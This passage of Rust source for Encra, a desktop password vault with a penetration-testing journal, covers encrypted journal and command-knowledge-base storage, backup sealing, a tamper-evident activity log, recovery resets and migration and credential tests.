        let open = |column: &str, stored: String| fields::open_to_string(&key, "projects", &id, column, &stored);
        Ok(journal::Project {
            name: open("name", row.get(1)?).unwrap_or_else(|_| "[unreadable]".into()),
            description: open("description", row.get(2)?).unwrap_or_default(),
            target: open("target", row.get(3)?).unwrap_or_default(),
            methodology: open("methodology", row.get(4)?).unwrap_or_default(),
            status: row.get(5)?, created_at: row.get(6)?, updated_at: row.get(7)?,
            id,
        })
    })
    .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
    results
}

#[tauri::command]
fn delete_project(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    // The entries and the project must disappear together: a crash between the
    // two deletes used to leave orphaned entries behind.
    in_transaction(&db, || {
        db.execute("DELETE FROM journal_entries WHERE project_id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
        db.execute("DELETE FROM projects WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
        Ok(())
    })?;
    Ok(())
}

#[tauri::command]
fn add_entry(state: tauri::State<AppState>, input: journal::EntryInput) -> Result<journal::JournalEntry, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    check_field(&input.title, "entry title", MAX_FIELD_CHARS)?;
    check_field(&input.content, "entry content", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.entry_type, "entry type", MAX_FIELD_CHARS)?;
    check_field(&input.severity, "severity", MAX_FIELD_CHARS)?;
    if input.title.trim().is_empty() {
        return Err("entry title must not be empty".into());
    }
    let id = uuid_v4();
    let enc_title = fields::seal(&key, "journal_entries", &id, "title", &input.title)?;
    let enc_content = fields::seal(&key, "journal_entries", &id, "content", &input.content)?;
    let project_id = input.project_id.clone();
    let id_for_insert = id.clone();
    in_transaction(&db, || {
        db.execute("INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            rusqlite::params![id_for_insert, project_id, enc_title, enc_content, input.entry_type, input.severity])
            .map_err(|e| e.to_string())?;
        db.execute("UPDATE projects SET updated_at = datetime('now') WHERE id = ?1", rusqlite::params![project_id]).map_err(|e| e.to_string())?;
        Ok(())
    })?;
    Ok(journal::JournalEntry { id, project_id: input.project_id, title: input.title, content: input.content, entry_type: input.entry_type, severity: input.severity, created_at: "just now".into() })
}

#[tauri::command]
fn get_entries(state: tauri::State<AppState>, project_id: String) -> Result<Vec<journal::JournalEntry>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let mut stmt = db.prepare("SELECT id, project_id, title, content, entry_type, severity, created_at FROM journal_entries WHERE project_id = ?1 ORDER BY created_at DESC")
        .map_err(|e| e.to_string())?;
    let results = stmt.query_map(rusqlite::params![project_id], |row| {
        let id: String = row.get(0)?;
        let open = |column: &str, stored: String| fields::open_to_string(&key, "journal_entries", &id, column, &stored);
        Ok(journal::JournalEntry {
            project_id: row.get(1)?,
            title: open("title", row.get(2)?).unwrap_or_else(|_| "[unreadable]".into()),
            content: open("content", row.get(3)?).unwrap_or_else(|_| "[unreadable]".into()),
            entry_type: row.get(4)?, severity: row.get(5)?, created_at: row.get(6)?,
            id,
        })
    })
    .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
    results
}

#[tauri::command]
fn delete_entry(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    db.execute("DELETE FROM journal_entries WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
    Ok(())
}

/// Insert a batch of journal entries as one all-or-nothing operation.
///
/// Shared by the command and the tests. Used for bulk operations such as saving
/// a parsed scan, where a partial write would leave an engagement with some of
/// its hosts recorded and no way to tell which.
fn insert_entries(
    db: &Connection,
    key: &[u8; 32],
    inputs: &[journal::EntryInput],
) -> Result<usize, String> {
    if inputs.is_empty() {
        return Ok(0);
    }

    // Validate and encrypt everything before opening the transaction, so a bad
    // row cannot leave the batch half-written.
    let mut prepared = Vec::with_capacity(inputs.len());
    for input in inputs {
        check_field(&input.title, "entry title", MAX_FIELD_CHARS)?;
        check_field(&input.content, "entry content", MAX_LONG_FIELD_CHARS)?;
        check_field(&input.entry_type, "entry type", MAX_FIELD_CHARS)?;
        check_field(&input.severity, "severity", MAX_FIELD_CHARS)?;
        if input.title.trim().is_empty() {
            return Err("entry title must not be empty".into());
        }
        let id = uuid_v4();
        let title = fields::seal(key, "journal_entries", &id, "title", &input.title)?;
        let content = fields::seal(key, "journal_entries", &id, "content", &input.content)?;
        prepared.push((
            id,
            input.project_id.clone(),
            title,
            content,
            input.entry_type.clone(),
            input.severity.clone(),
        ));
    }

    in_transaction(db, || {
        let mut touched_projects: Vec<&String> = Vec::new();
        for (id, project_id, title, content, entry_type, severity) in &prepared {
            db.execute(
                "INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
                rusqlite::params![id, project_id, title, content, entry_type, severity],
            ).map_err(|e| e.to_string())?;
            if !touched_projects.contains(&project_id) {
                touched_projects.push(project_id);
            }
        }
        for project_id in &touched_projects {
            db.execute(
                "UPDATE projects SET updated_at = datetime('now') WHERE id = ?1",
                rusqlite::params![project_id],
            ).map_err(|e| e.to_string())?;
        }
        Ok(prepared.len())
    })
}

#[tauri::command]
fn add_entries(state: tauri::State<AppState>, inputs: Vec<journal::EntryInput>) -> Result<usize, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    insert_entries(&db, &key, &inputs)
}

// ===== Nmap =====

#[tauri::command]
fn parse_nmap(xml_content: String) -> Result<nmap::NmapScan, String> {
    nmap::parse_nmap_xml(&xml_content)
}

// ===== Command KB =====

#[tauri::command]
fn add_kb_entry(state: tauri::State<AppState>, input: kb::KBInput) -> Result<kb::KBEntry, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    check_field(&input.title, "title", MAX_FIELD_CHARS)?;
    check_field(&input.command, "command", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.description, "description", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.tags, "tags", MAX_FIELD_CHARS)?;
    check_field(&input.category, "category", MAX_FIELD_CHARS)?;
    if input.title.trim().is_empty() {
        return Err("title must not be empty".into());
    }
    let id = uuid_v4();
    let seal = |column: &str, value: &str| fields::seal(&key, "kb_entries", &id, column, value);
    let enc_title = seal("title", &input.title)?;
    let enc_cmd = seal("command", &input.command)?;
    let enc_desc = seal("description", &input.description)?;
    let enc_tags = seal("tags", &input.tags)?;
    db.execute("INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
        rusqlite::params![id, enc_title, enc_cmd, enc_desc, enc_tags, input.category])
        .map_err(|e| e.to_string())?;
    Ok(kb::KBEntry { id, title: input.title, command: input.command, description: input.description, tags: input.tags, category: input.category, created_at: "just now".into() })
}

#[tauri::command]
fn get_kb_entries(state: tauri::State<AppState>) -> Result<Vec<kb::KBEntry>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let mut stmt = db.prepare("SELECT id, title, command, description, tags, category, created_at FROM kb_entries ORDER BY created_at DESC")
        .map_err(|e| e.to_string())?;
    let results = stmt.query_map([], |row| {
        let id: String = row.get(0)?;
        let open = |column: &str, stored: String| fields::open_to_string(&key, "kb_entries", &id, column, &stored);
        Ok(kb::KBEntry {
            title: open("title", row.get(1)?).unwrap_or_else(|_| "[unreadable]".into()),
            // Empty rather than a placeholder, so a copy can never paste junk.
            command: open("command", row.get(2)?).unwrap_or_default(),
            description: open("description", row.get(3)?).unwrap_or_default(),
            tags: open("tags", row.get(4)?).unwrap_or_default(),
            category: row.get(5)?, created_at: row.get(6)?,
            id,
        })
    })
    .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
    results
}

#[tauri::command]
fn delete_kb_entry(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    db.execute("DELETE FROM kb_entries WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
    Ok(())
}

// ===== Backup =====

#[tauri::command]
fn export_backup(state: tauri::State<AppState>, backup_password: String) -> Result<String, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    require_min_length(&backup_password, "Backup password", MIN_BACKUP_PASSWORD_CHARS)?;

    let data = backup::collect_all(&db, &key)?;
    let json = zeroize::Zeroizing::new(serde_json::to_string(&data).map_err(|e| e.to_string())?);
    let bundled = seal_backup(&json, &backup_password)?;

    activity::log_action(&db, "backup_export", "vault exported");
    seal_log(&db, &key);
    Ok(bundled)
}

/// Backup files written since vault format 3 start with this, then the Argon2
/// settings, the salt and the payload. Older files are just "salt:payload".
const BACKUP_ENVELOPE: &str = "encra-backup:2";
const BACKUP_AAD: &str = "encra:v1:backup";

fn seal_backup(json: &str, backup_password: &str) -> Result<String, String> {
    let mut salt = [0u8; 32];
    fill_random(&mut salt);
    let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
    let params = vault::KdfParams::CURRENT;
    let mut wrapping_key = vault::derive_key_with(backup_password, &salt, params)?;
    let payload = vault::encrypt_bound(&wrapping_key, json, BACKUP_AAD);
    wrapping_key.zeroize();
    Ok(format!("{BACKUP_ENVELOPE}:{}:{salt_b64}:{}", params.encode(), payload?))
}

/// Decrypt a backup file. Its Argon2 settings come from the file itself, which
/// may be hostile, so they are bounds-checked before use (KdfParams::parse).
fn open_backup(bundled: &str, backup_password: &str) -> Result<zeroize::Zeroizing<String>, String> {
    let decode = |salt_b64: &str| base64::engine::general_purpose::STANDARD.decode(salt_b64).map_err(|_| "invalid backup format — bad salt".to_string());
    let bundled = bundled.trim();
    if let Some(rest) = bundled.strip_prefix(BACKUP_ENVELOPE).and_then(|rest| rest.strip_prefix(':')) {
        let mut parts = rest.splitn(3, ':');
        let (Some(params), Some(salt_b64), Some(payload)) = (parts.next(), parts.next(), parts.next()) else {
            return Err("invalid backup format — incomplete header".into());
        };
        let params = vault::KdfParams::parse(params)?;
        let mut wrapping_key = vault::derive_key_with(backup_password, &decode(salt_b64)?, params)?;
        let json = vault::decrypt_bound(&wrapping_key, payload, BACKUP_AAD);
        wrapping_key.zeroize();
        return json.map_err(|_| "wrong backup password, or the file is damaged".into());
    }
    // Before format 3: "salt:payload", library-default Argon2, no binding.
    let (salt_b64, payload) = bundled.split_once(':').ok_or("invalid backup format — missing salt")?;
    let mut wrapping_key = vault::derive_key(backup_password, &decode(salt_b64)?)?;
    let json = vault::decrypt(&wrapping_key, payload);
    wrapping_key.zeroize();
    json.map_err(|_| "wrong backup password, or the file is damaged".into())
}

#[tauri::command]
fn import_backup(state: tauri::State<AppState>, bundled: String, backup_password: String) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    reject_empty_password(&backup_password, "Backup password")?;

    let json = open_backup(&bundled, &backup_password)?;
    let data: backup::VaultBackup = serde_json::from_str(&json).map_err(|_| "invalid backup format — unreadable contents".to_string())?;

    // Plain text throughout, then sealed row by row under this vault's key as
    // each row gets its new id. A 1.0 payload this key cannot decrypt is
    // rejected rather than written back as unreadable bytes.
    let prepared = backup::prepare_for_import(data, &key)?;
    backup::restore_all(&db, &key, &prepared)?;
    activity::log_action(&db, "backup_import", "vault data imported");
    seal_log(&db, &key);
    Ok(())
}

// ===== Activity =====

#[derive(serde::Serialize)]
struct ActivityLog {
    entries: Vec<activity::ActivityEntry>,
    chain: activity::ChainStatus,
}

#[tauri::command]
fn get_activity_log(state: tauri::State<AppState>) -> Result<ActivityLog, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    // Verify before sealing, so new entries are never sealed on top of a
    // chain that was tampered with (that would launder the tampering).
    let mut chain = activity::verify_chain(&db, &key)?;
    if chain.intact && chain.pending > 0 {
        seal_log(&db, &key);
        chain = activity::verify_chain(&db, &key)?;
    }
    let mut stmt = db.prepare("SELECT id, action, detail, timestamp FROM activity_log ORDER BY seq DESC, rowid DESC LIMIT 100")
        .map_err(|e| e.to_string())?;
    let entries = stmt.query_map([], |row| Ok(activity::ActivityEntry { id: row.get(0)?, action: row.get(1)?, detail: row.get(2)?, timestamp: row.get(3)? }))
        .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
    Ok(ActivityLog { entries, chain })
}

// ===== Recovery =====

#[tauri::command]
fn verify_master_password(state: tauri::State<AppState>, password: String) -> Result<bool, String> {
    let db = require_db(&state)?;
    let stored_hash: String = db.query_row(
        "SELECT value FROM vault_config WHERE key = 'password_hash'", [], |r| r.get(0)
    ).map_err(|e| e.to_string())?;
    vault::verify_password(&password, &stored_hash)
}

#[tauri::command]
fn generate_recovery_codes(state: tauri::State<AppState>) -> Result<Vec<String>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    activity::generate_recovery_codes(&db, &key)
}

#[tauri::command]
fn reset_master_password(state: tauri::State<AppState>, recovery_code: String, new_password: String) -> Result<bool, String> {
    let db = require_db(&state)?;
    require_min_length(&new_password, "New master password", MIN_MASTER_PASSWORD_CHARS)?;

    // The lookup, the password change, and the consumption of the one-time code
    // commit together. Nobody can spend a code without the reset landing, and
    // two concurrent attempts cannot both succeed.
    let mut dek = match activity::recover_and_reset(&db, &recovery_code, &new_password)? {
        Some(dek) => dek,
        None => return Ok(false),
    };

    // Recovery opens the vault without going through unlock, so it has to
    // bring an older vault up to date itself before publishing the key.
    activity::log_action(&db, "recovery", "master password reset via recovery code");
    let migrated = bring_up_to_date(&db, &new_password, &dek);
    if let Err(error) = migrated {
        dek.zeroize();
        return Err(error);
    }

    {
        let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
        *ek = Some(Dek::new(dek));
    }
    dek.zeroize();
    Ok(true)
}

// ===== Startup =====

fn main() {
    let result = tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        .setup(|app| {
            let db_path = vault_path(app.handle()).map_err(std::io::Error::other)?;
            // Fail loudly instead of panicking: a corrupt or unwritable data
            // directory is a condition the user can act on, not a crash.
            if let Some(parent) = db_path.parent() {
                std::fs::create_dir_all(parent).map_err(std::io::Error::other)?;
            }

            let conn = vault::init_db(&db_path).map_err(std::io::Error::other)?;
            // Defence in depth only: a filesystem that refuses chmod must not
            // keep anyone out of their own vault.
            if let Err(error) = restrict_permissions(&db_path) {
                eprintln!("Encra could not restrict vault permissions: {error}");
            }
            journal::init_journal_tables(&conn).map_err(std::io::Error::other)?;
            kb::init_kb_tables(&conn).map_err(std::io::Error::other)?;
            activity::init_activity_table(&conn).map_err(std::io::Error::other)?;

            // Enable foreign keys
            conn.execute_batch("PRAGMA foreign_keys = ON;")
                .map_err(std::io::Error::other)?;

            app.manage(AppState {
                db: Mutex::new(conn),
                encryption_key: Mutex::new(None),
            });
            app.manage(ClipboardGuard::system());
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            list_credentials, get_credential, reveal_password, describe_password, get_totp,
            copy_credential_field, copy_text, check_credential_breach,
            add_credential, update_credential, delete_credential,
            vault_status, create_vault, unlock_vault, lock_vault,
            safety_copy_exists, delete_safety_copy,
            setup_totp, get_totp_remaining, remove_totp,
            check_hibp,
            create_project, get_projects, delete_project,
            add_entry, add_entries, get_entries, delete_entry,
            parse_nmap,
            add_kb_entry, get_kb_entries, delete_kb_entry,
            export_backup, import_backup,
            get_activity_log,
            generate_recovery_codes, reset_master_password, verify_master_password,
        ])
        .run(tauri::generate_context!());

    if let Err(error) = result {
        eprintln!("Encra failed to start: {error}");
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn migration_test_dir(label: &str) -> PathBuf {
        let path = std::env::temp_dir().join(format!("encra-{label}-{}", uuid_v4()));
        std::fs::create_dir_all(&path).unwrap();
        path
    }

    fn create_marker_database(path: &Path, marker: &str) {
        let db = Connection::open(path).unwrap();
        db.execute("CREATE TABLE migration_marker (value TEXT NOT NULL)", []).unwrap();
        db.execute("INSERT INTO migration_marker (value) VALUES (?1)", [marker]).unwrap();
    }

    fn read_marker_after_reopen(path: &Path) -> String {
        let db = Connection::open(path).unwrap();
        db.query_row("SELECT value FROM migration_marker", [], |row| row.get(0)).unwrap()
    }

    #[test]
    fn test_database_brand_migration_copies_and_reopens_without_removing_legacy() {
        let dir = migration_test_dir("brand-migration-success");
        let legacy = dir.join(LEGACY_VAULTS[0].1);
        let current = dir.join(CURRENT_DATABASE_NAME);
        create_marker_database(&legacy, "legacy-vault-survives");

        let migrated = migrate_database_if_needed(&current, std::slice::from_ref(&legacy)).unwrap();

        assert!(migrated);
        assert!(legacy.is_file(), "previous vault database must remain recoverable");
        assert!(current.is_file(), "Encra database must be activated atomically");
        assert_eq!(read_marker_after_reopen(&current), "legacy-vault-survives");
        assert_eq!(read_marker_after_reopen(&legacy), "legacy-vault-survives");
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_database_brand_migration_never_overwrites_existing_encra_vault() {
        let dir = migration_test_dir("brand-migration-no-overwrite");
        let legacy = dir.join(LEGACY_VAULTS[0].1);
        let current = dir.join(CURRENT_DATABASE_NAME);
        create_marker_database(&legacy, "legacy-value");
        create_marker_database(&current, "current-value");

        let migrated = migrate_database_if_needed(&current, &[legacy]).unwrap();

        assert!(!migrated);
        assert_eq!(read_marker_after_reopen(&current), "current-value");
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_database_brand_migration_failure_leaves_source_and_destination_unchanged() {
        let dir = migration_test_dir("brand-migration-failure");
        let legacy = dir.join(LEGACY_VAULTS[0].1);
        let current = dir.join(CURRENT_DATABASE_NAME);
        let corrupt_bytes = b"not a sqlite database";
        std::fs::write(&legacy, corrupt_bytes).unwrap();

        let result = migrate_database_if_needed(&current, std::slice::from_ref(&legacy));

        assert!(result.is_err());
        assert!(!current.exists(), "failed migration must not activate a partial database");
        assert_eq!(std::fs::read(&legacy).unwrap(), corrupt_bytes);
        std::fs::remove_dir_all(dir).unwrap();
    }

    /// Lay out the real macOS shape: `<root>/<identifier>/<file>` per product.
    fn app_data_root(label: &str) -> (PathBuf, PathBuf) {
        let root = migration_test_dir(label);
        let encra_dir = root.join("com.encra.desktop");
        (root, encra_dir)
    }

    #[test]
    fn test_brand_migration_prefers_cobrypt_over_keyrpt_and_keeps_both() {
        let (root, encra_dir) = app_data_root("brand-prefers-cobrypt");
        let cobrypt = root.join("com.cobrypt.desktop").join("cobrypt.db");
        let keyrpt = root.join("com.keyrpt.app").join("keyrpt.db");
        std::fs::create_dir_all(cobrypt.parent().unwrap()).unwrap();
        std::fs::create_dir_all(keyrpt.parent().unwrap()).unwrap();
        create_marker_database(&cobrypt, "cobrypt-vault");
        create_marker_database(&keyrpt, "keyrpt-vault");
        let cobrypt_bytes = std::fs::read(&cobrypt).unwrap();
        let keyrpt_bytes = std::fs::read(&keyrpt).unwrap();

        // The Encra data directory does not exist yet on a first launch.
        let current = encra_dir.join(CURRENT_DATABASE_NAME);
        let migrated = migrate_database_if_needed(&current, &legacy_database_candidates(&encra_dir)).unwrap();

        assert!(migrated);
        assert_eq!(read_marker_after_reopen(&current), "cobrypt-vault");
        assert_eq!(std::fs::read(&cobrypt).unwrap(), cobrypt_bytes, "Cobrypt source must be untouched");
        assert_eq!(std::fs::read(&keyrpt).unwrap(), keyrpt_bytes, "KeyRPT source must be untouched");
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn test_brand_migration_falls_back_to_keyrpt_without_cobrypt() {
        let (root, encra_dir) = app_data_root("brand-falls-back-keyrpt");
        let keyrpt = root.join("com.keyrpt.app").join("keyrpt.db");
        std::fs::create_dir_all(keyrpt.parent().unwrap()).unwrap();
        // An empty Cobrypt directory, as left behind by an uninstall.
        std::fs::create_dir_all(root.join("com.cobrypt.desktop")).unwrap();
        create_marker_database(&keyrpt, "keyrpt-vault");

        let current = encra_dir.join(CURRENT_DATABASE_NAME);
        let migrated = migrate_database_if_needed(&current, &legacy_database_candidates(&encra_dir)).unwrap();

        assert!(migrated);
        assert_eq!(read_marker_after_reopen(&current), "keyrpt-vault");
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn test_brand_migration_with_nothing_to_migrate_is_a_no_op() {
        let (root, encra_dir) = app_data_root("brand-nothing");
        let current = encra_dir.join(CURRENT_DATABASE_NAME);

        let migrated = migrate_database_if_needed(&current, &legacy_database_candidates(&encra_dir)).unwrap();

        assert!(!migrated);
        assert!(!current.exists(), "a fresh install must start with no vault file");
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn test_migrated_cobrypt_vault_unlocks_with_same_password_after_reopen() {
        let (root, encra_dir) = app_data_root("brand-real-vault");
        let cobrypt = root.join("com.cobrypt.desktop").join("cobrypt.db");
        std::fs::create_dir_all(cobrypt.parent().unwrap()).unwrap();
        let password = "migration-master-password";
        let dek = create_test_vault(&cobrypt, password);
        {
            let conn = Connection::open(&cobrypt).unwrap();
            seed_vault(&conn, &dek);
        }

        let current = encra_dir.join(CURRENT_DATABASE_NAME);
        assert!(migrate_database_if_needed(&current, &legacy_database_candidates(&encra_dir)).unwrap());

        // Fresh connection to the migrated file, as the next app launch would do.
        let conn = vault::init_db(&current).unwrap();
        let config = |key: &str| -> String {
            conn.query_row("SELECT value FROM vault_config WHERE key = ?1", [key], |row| row.get(0)).unwrap()
        };
        assert!(vault::verify_password(password, &config("password_hash")).unwrap());
        assert!(!vault::verify_password("wrong-password-123", &config("password_hash")).unwrap());

        let salt = base64::engine::general_purpose::STANDARD.decode(config("kdf_salt")).unwrap();
        let mut wrapping_key = vault::derive_key(password, &salt).unwrap();
        let unwrapped = vault::unwrap_dek(&config("encrypted_dek"), &wrapping_key).unwrap();
        wrapping_key.zeroize();
        assert_eq!(unwrapped, dek, "migrated vault must yield the same data key");

        let stored_pw: String = conn
            .query_row("SELECT password_encrypted FROM credentials WHERE id = 'c1'", [], |row| row.get(0))
            .unwrap();
        assert_eq!(vault::decrypt_to_string(&unwrapped, &stored_pw).unwrap(), "gh_p@$$w0rd");
        drop(conn);
        std::fs::remove_dir_all(root).unwrap();
    }

    // ===== Credential reads that keep secrets in Rust =====

    /// A seeded, file-backed vault, reopened through a fresh connection so
    /// every read below goes through what is actually on disk.
    fn reopened_seeded_vault(label: &str) -> (PathBuf, Connection, [u8; 32]) {
        let dir = migration_test_dir(label);
        let path = dir.join(CURRENT_DATABASE_NAME);
        let dek = create_test_vault(&path, "credential-read-password");
        {
            let conn = Connection::open(&path).unwrap();
            seed_vault(&conn, &dek);
            // Format 2 data, brought to format 3 exactly as at unlock.
            bring_up_to_date(&conn, "credential-read-password", &dek).unwrap();
        }
        let conn = vault::init_db(&path).unwrap();
        (dir, conn, dek)
    }

    #[test]
    fn test_credential_list_carries_no_secrets() {
        let (dir, conn, dek) = reopened_seeded_vault("cred-list");

        let list = credentials::list_summaries(&conn, &dek).unwrap();
        let json = serde_json::to_string(&list).unwrap();

        assert_eq!(list.len(), 2);
        for secret in ["gh_p@$$w0rd", "short12chars", "personal account", "JBSWY3DPEHPK3PXP", "https://github.com", "prod"] {
            assert!(!json.contains(secret), "list must not carry {secret:?}: {json}");
        }
        let github = list.iter().find(|c| c.id == "c1").unwrap();
        assert_eq!(github.username, "dev@example.com");
        assert!(github.has_totp);
        assert!(!list.iter().find(|c| c.id == "c2").unwrap().has_totp);
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_credential_detail_reveal_and_copy_values() {
        let (dir, conn, dek) = reopened_seeded_vault("cred-fields");

        let detail = credentials::detail(&conn, &dek, "c1").unwrap();
        assert_eq!(detail.url, "https://github.com");
        assert_eq!(detail.notes, "personal account");
        assert_eq!(credentials::reveal_password(&conn, &dek, "c1").unwrap().as_str(), "gh_p@$$w0rd");

        let copy = |field| credentials::copy_value(&conn, &dek, "c1", field).unwrap().to_string();
        assert_eq!(copy(CopyField::Username), "dev@example.com");
        assert_eq!(copy(CopyField::Password), "gh_p@$$w0rd");
        assert_eq!(copy(CopyField::Url), "https://github.com");
        let code = credentials::totp_code(&conn, &dek, "c1").unwrap().unwrap();
        assert_eq!(code.code.len(), 6);
        assert!(code.code.chars().all(|c| c.is_ascii_digit()));
        assert!((1..=30).contains(&code.remaining));

        assert_eq!(credentials::totp_code(&conn, &dek, "c2").unwrap(), None);
        assert!(credentials::copy_value(&conn, &dek, "c2", CopyField::Totp).is_err());
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_credential_reads_fail_cleanly_on_bad_input() {
        let (dir, conn, dek) = reopened_seeded_vault("cred-bad-input");

        // Unknown id: an error, not an empty value.
        assert!(credentials::detail(&conn, &dek, "missing").is_err());
        assert!(credentials::reveal_password(&conn, &dek, "missing").is_err());
        assert!(credentials::copy_value(&conn, &dek, "missing", CopyField::Password).is_err());

        // Wrong key: the password is an error, never placeholder text that could
        // be copied as if it were real; the list still loads with blank usernames.
        let wrong = [7u8; 32];
        let err = credentials::reveal_password(&conn, &wrong, "c1").unwrap_err();
        assert!(!err.contains("[decryption failed]"));
        let list = credentials::list_summaries(&conn, &wrong).unwrap();
        assert!(list.iter().all(|c| c.username.is_empty()));

        // Corrupted ciphertext on disk: errors, no panic.
        conn.execute("UPDATE credentials SET password_encrypted = 'not base64 at all!', totp_secret = 'AAAA' WHERE id = 'c1'", []).unwrap();
        assert!(credentials::reveal_password(&conn, &dek, "c1").is_err());
        assert!(credentials::totp_code(&conn, &dek, "c1").is_err());
        assert!(credentials::copy_value(&conn, &dek, "c1", CopyField::Password).is_err());
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_copy_credential_field_reaches_the_clipboard_and_lock_wipes_it() {
        use clipboard::tests::FakeClipboard;
        let (dir, conn, dek) = reopened_seeded_vault("cred-copy");
        let fake = Arc::new(FakeClipboard::default());
        let guard = ClipboardGuard::new(Box::new(Arc::clone(&fake)), std::time::Duration::from_secs(60));

        let value = credentials::copy_value(&conn, &dek, "c1", CopyField::Password).unwrap();
        guard.copy(&value).unwrap();
        assert_eq!(fake.0.lock().unwrap().as_deref(), Some("gh_p@$$w0rd"));

        assert!(guard.wipe_now(), "locking must wipe a pending copy");
        assert_eq!(*fake.0.lock().unwrap(), None);
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    // ===== Create, unlock and status =====

    /// A file-backed database with the tables but no master password yet.
    fn fresh_vault_file(label: &str) -> (PathBuf, PathBuf) {
        let dir = migration_test_dir(label);
        let path = dir.join(CURRENT_DATABASE_NAME);
        let conn = vault::init_db(&path).unwrap();
        activity::init_activity_table(&conn).unwrap();
        (dir, path)
    }

    fn activity_actions(conn: &Connection) -> Vec<String> {
        let mut stmt = conn.prepare("SELECT action FROM activity_log").unwrap();
        stmt.query_map([], |row| row.get(0)).unwrap().collect::<Result<_, _>>().unwrap()
    }

    #[test]
    fn test_create_vault_then_unlock_after_reopen() {
        let (dir, path) = fresh_vault_file("create-unlock");
        let password = "a-long-master-password";
        let dek = {
            let conn = Connection::open(&path).unwrap();
            assert_eq!(vault_kind(&conn).unwrap(), VaultKind::Fresh);
            create_vault_impl(&conn, password).unwrap()
        };

        let conn = vault::init_db(&path).unwrap();
        assert!(matches!(vault_kind(&conn).unwrap(), VaultKind::Current { .. }));
        assert_eq!(unlock_current_vault(&conn, password).unwrap(), Some(dek));
        assert_eq!(unlock_current_vault(&conn, "not-the-password").unwrap(), None);

        let actions = activity_actions(&conn);
        assert!(actions.contains(&"vault_created".to_string()));
        assert!(actions.contains(&"unlock".to_string()));
        assert!(actions.contains(&"unlock_failed".to_string()), "a wrong password must be logged");
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_create_vault_refuses_to_replace_an_existing_vault() {
        let (dir, path) = fresh_vault_file("create-twice");
        let conn = Connection::open(&path).unwrap();
        let dek = create_vault_impl(&conn, "the-original-password").unwrap();

        assert!(create_vault_impl(&conn, "a-replacement-password").is_err());
        drop(conn);

        let conn = vault::init_db(&path).unwrap();
        assert_eq!(unlock_current_vault(&conn, "the-original-password").unwrap(), Some(dek));
        assert_eq!(unlock_current_vault(&conn, "a-replacement-password").unwrap(), None);
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_create_vault_rejects_short_password_and_stays_fresh() {
        let (dir, path) = fresh_vault_file("create-short");
        let conn = Connection::open(&path).unwrap();
        assert!(create_vault_impl(&conn, "short").is_err());
        assert_eq!(vault_kind(&conn).unwrap(), VaultKind::Fresh);
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_create_vault_rolls_back_when_a_write_fails() {
        let (dir, path) = fresh_vault_file("create-rollback");
        let conn = Connection::open(&path).unwrap();
        // Fail the second of the four config writes, after encrypted_dek landed.
        conn.execute_batch(
            "CREATE TRIGGER fail_hash BEFORE INSERT ON vault_config WHEN NEW.key = 'password_hash'
             BEGIN SELECT RAISE(ABORT, 'injected failure'); END;",
        ).unwrap();

        assert!(create_vault_impl(&conn, "a-long-master-password").is_err());
        // The trigger would also fire on init_db's own setup inserts.
        conn.execute_batch("DROP TRIGGER fail_hash").unwrap();
        drop(conn);

        let conn = vault::init_db(&path).unwrap();
        assert_eq!(vault_kind(&conn).unwrap(), VaultKind::Fresh, "a failed create must leave no half-made vault");
        let dek_value: String = conn.query_row("SELECT value FROM vault_config WHERE key = 'encrypted_dek'", [], |r| r.get(0)).unwrap();
        assert!(dek_value.is_empty());
